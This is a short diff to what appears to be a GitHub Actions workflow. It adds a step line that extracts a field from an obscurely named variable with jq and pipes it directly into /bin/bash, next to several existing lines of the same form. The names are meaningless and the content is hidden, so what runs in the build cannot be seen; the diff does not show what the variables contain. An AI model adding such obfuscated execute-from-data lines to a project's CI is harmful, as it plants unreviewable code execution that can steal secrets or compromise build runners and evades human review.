@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$ji3" | jq -r .hfm03 | /bin/bash
           echo $rqf0364 | jq -r .wlirr57166 | /bin/bash
           printf '%s' "$gpk1850" | jq -r .e0691 | /bin/bash
+          echo $a8 | jq -r .nrl019 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
